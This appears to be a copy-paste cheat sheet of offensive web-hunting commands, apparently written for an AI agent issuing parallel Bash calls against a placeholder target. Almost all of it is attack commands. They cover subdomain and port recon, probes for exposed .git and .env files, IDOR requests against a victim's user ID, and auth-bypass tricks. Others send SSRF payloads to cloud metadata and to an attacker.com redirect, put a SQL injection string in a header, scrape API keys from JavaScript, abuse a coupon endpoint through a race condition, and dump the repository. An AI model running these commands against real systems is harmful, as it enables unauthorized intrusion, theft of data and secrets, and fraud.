## SPEED COMMANDS ARSENAL — COPY-PASTE READY

**Fast hunting = right commands, run in parallel, no time wasted typing.**

### RECON BLITZ (run ALL in parallel — 4 Bash calls in one message):

```bash
# CMD 1: Subdomain enum
subfinder -d TARGET -all -o subs.txt && cat subs.txt | httpx -silent -title -status-code -tech-detect -o live.txt

# CMD 2: URL crawling + JS endpoints
katana -u https://TARGET -d 3 -jc -o urls.txt && grep -E "\.js$" urls.txt | while read url; do python3 /opt/LinkFinder/linkfinder.py -i "$url" -o cli; done > js_endpoints.txt 2>/dev/null

# CMD 3: Content discovery
feroxbuster -u https://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50 --smart -o dirs.txt

# CMD 4: Port scan
nmap -sV -sC --top-ports 1000 -T4 TARGET -oN nmap.txt
```

### FAST INITIAL PROBE (run ALL in parallel — one message):

```bash
# CMD 1: Homepage + tech fingerprint
curl -sk -x http://127.0.0.1:8080 -D- "https://TARGET/" -o /dev/null | head -30

# CMD 2: Common files
curl -sk -x http://127.0.0.1:8080 "https://TARGET/robots.txt" && curl -sk -x http://127.0.0.1:8080 "https://TARGET/sitemap.xml" && curl -sk -x http://127.0.0.1:8080 "https://TARGET/.well-known/security.txt"

# CMD 3: Hidden paths
curl -sk -x http://127.0.0.1:8080 -o /dev/null -w "%{http_code}" "https://TARGET/.git/HEAD" && echo " .git" && curl -sk -x http://127.0.0.1:8080 -o /dev/null -w "%{http_code}" "https://TARGET/.env" && echo " .env" && curl -sk -x http://127.0.0.1:8080 -o /dev/null -w "%{http_code}" "https://TARGET/swagger.json" && echo " swagger" && curl -sk -x http://127.0.0.1:8080 -o /dev/null -w "%{http_code}" "https://TARGET/graphql" && echo " graphql"

# CMD 4: WAF detection
wafw00f https://TARGET 2>/dev/null || curl -sk -x http://127.0.0.1:8080 -H "X-Forwarded-For: 127.0.0.1' OR 1=1--" "https://TARGET/" -o /dev/null -w "%{http_code}"
```

### IDOR SPEED TEST (test 5 endpoints in parallel):

```bash
# Replace VICTIM_ID with target user's ID, use your own auth token
# CMD 1-5: Run ALL simultaneously
curl -sk -x http://127.0.0.1:8080 -H "Authorization: Bearer YOUR_TOKEN" "https://TARGET/api/users/VICTIM_ID/profile"
curl -sk -x http://127.0.0.1:8080 -H "Authorization: Bearer YOUR_TOKEN" "https://TARGET/api/users/VICTIM_ID/orders"
curl -sk -x http://127.0.0.1:8080 -H "Authorization: Bearer YOUR_TOKEN" "https://TARGET/api/users/VICTIM_ID/settings"
curl -sk -x http://127.0.0.1:8080 -H "Authorization: Bearer YOUR_TOKEN" "https://TARGET/api/users/VICTIM_ID/payments"
curl -sk -x http://127.0.0.1:8080 -H "Authorization: Bearer YOUR_TOKEN" "https://TARGET/api/users/VICTIM_ID/export"
```

### AUTH BYPASS SPEED TEST (parallel):

```bash
# CMD 1: No auth header
curl -sk -x http://127.0.0.1:8080 "https://TARGET/api/admin/users"

# CMD 2: Empty bearer
curl -sk -x http://127.0.0.1:8080 -H "Authorization: Bearer " "https://TARGET/api/admin/users"

# CMD 3: Method switch
curl -sk -x http://127.0.0.1:8080 -X PUT "https://TARGET/api/admin/users"

# CMD 4: Path traversal bypass
curl -sk -x http://127.0.0.1:8080 "https://TARGET/api/..;/admin/users"

# CMD 5: Case variation
curl -sk -x http://127.0.0.1:8080 "https://TARGET/api/Admin/Users"
```

### SSRF QUICK TEST (parallel):

```bash
# CMD 1: Basic localhost
curl -sk -x http://127.0.0.1:8080 "https://TARGET/api/fetch?url=http://127.0.0.1"

# CMD 2: Cloud metadata
curl -sk -x http://127.0.0.1:8080 "https://TARGET/api/fetch?url=http://169.254.169.254/latest/meta-data/"

# CMD 3: Collaborator (generate payload with mcp__burp__generate_collaborator_payload first)
curl -sk -x http://127.0.0.1:8080 "https://TARGET/api/fetch?url=http://COLLABORATOR_URL"

# CMD 4: DNS bypass
curl -sk -x http://127.0.0.1:8080 "https://TARGET/api/fetch?url=http://0x7f000001"

# CMD 5: Redirect bypass
curl -sk -x http://127.0.0.1:8080 "https://TARGET/api/fetch?url=http://attacker.com/redirect?to=http://127.0.0.1"
```

### PARAMETER FUZZING (background — long running):

```bash
# Content discovery with custom wordlist (run in background)
ffuf -u "https://TARGET/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -mc 200,301,302,403 -t 40 -o ffuf_dirs.json

# Parameter discovery
ffuf -u "https://TARGET/api/endpoint?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200 -fs 0 -t 30 -o ffuf_params.json

# Virtual host discovery
ffuf -u "https://TARGET/" -H "Host: FUZZ.TARGET" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200 -fs SIZE_OF_DEFAULT -t 30
```

### NUCLEI TARGETED SCAN (background):

```bash
# Critical + High templates only — not full scan
nuclei -u https://TARGET -severity critical,high -o nuclei_results.txt

# Technology-specific
nuclei -u https://TARGET -tags cve,exposure,misconfig -severity critical,high,medium -o nuclei_tech.txt

# CVE-only scan
nuclei -u https://TARGET -tags cve -o nuclei_cve.txt
```

### JS SECRETS EXTRACTION (parallel):

```bash
# CMD 1: Find all JS files
katana -u https://TARGET -jc -d 2 -ef css,png,jpg,gif,svg,woff -f qurl | grep "\.js$" | sort -u > js_files.txt

# CMD 2: Extract secrets from JS (run after CMD 1)
cat js_files.txt | while read url; do
  curl -sk "$url" | grep -oE "(api[_-]?key|apikey|secret|token|password|AWS_ACCESS|AKIA[A-Z0-9]{16}|sk_live_|pk_live_)['\"]?\s*[:=]\s*['\"][a-zA-Z0-9/+=-]{10,}['\"]"
done > js_secrets.txt

# CMD 3: Extract endpoints from JS
cat js_files.txt | while read url; do
  python3 /opt/LinkFinder/linkfinder.py -i "$url" -o cli 2>/dev/null
done | sort -u > js_endpoints.txt
```

### RACE CONDITION SINGLE-PACKET (use turbo intruder or curl parallel):

```bash
# Send 10 identical requests simultaneously using GNU parallel
seq 1 10 | parallel -j 10 "curl -sk -x http://127.0.0.1:8080 -X POST -H 'Authorization: Bearer TOKEN' -H 'Content-Type: application/json' -d '{\"coupon\":\"DISCOUNT50\"}' 'https://TARGET/api/apply-coupon' -w '%{http_code}\n' -o /dev/null"
```

### CLOUD STORAGE CHECK (parallel):

```bash
# CMD 1: S3 buckets
curl -sk "https://TARGET.s3.amazonaws.com/" && curl -sk "https://s3.amazonaws.com/TARGET/"

# CMD 2: Azure blob
curl -sk "https://TARGET.blob.core.windows.net/\$web?restype=container&comp=list"

# CMD 3: GCS
curl -sk "https://storage.googleapis.com/TARGET/"
```

### GIT EXPOSURE EXTRACTION:

```bash
# Check if .git is exposed
curl -sk -x http://127.0.0.1:8080 "https://TARGET/.git/HEAD"
# If 200 → dump the repo:
# git-dumper https://TARGET/.git/ ./git_dump (install: pip install git-dumper)
```

### COMMAND CHAINING — FULL AUTO RECON (run as single background task):

```bash
# Full recon pipeline — runs sequentially but as one background command
subfinder -d TARGET -silent -o subs.txt && \
cat subs.txt | httpx -silent -o live.txt && \
cat live.txt | katana -d 2 -jc -silent -o urls.txt && \
cat urls.txt | grep -E "\.js$" | sort -u > js.txt && \
nuclei -l live.txt -severity critical,high -silent -o nuclei.txt && \
echo "RECON COMPLETE: $(wc -l subs.txt) subs, $(wc -l live.txt) live, $(wc -l urls.txt) urls, $(wc -l nuclei.txt) nuclei hits"
```
